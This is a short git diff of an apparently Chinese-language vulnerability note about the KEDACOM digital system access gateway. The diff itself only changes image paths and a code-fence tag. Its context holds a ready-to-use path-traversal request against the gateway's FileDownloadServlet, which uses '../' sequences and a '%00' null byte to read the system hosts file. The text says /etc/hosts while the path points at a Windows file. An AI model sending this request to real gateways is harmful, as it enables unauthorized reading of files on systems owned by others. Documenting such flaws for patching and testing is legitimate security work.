@@ -20,12 +20,12 @@ KEDACOM 数字系统接入网关
 
 登录页面如下
 
-![](images/202202162300072.png)
+![](../.gitbook/assets/202202162300072.png)
 
 使用POC读取 /etc/hosts
 
-```plain
+```
 /gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2
 ```
 
-![](images/202202162300019.png)
+![](../.gitbook/assets/202202162300019.png)
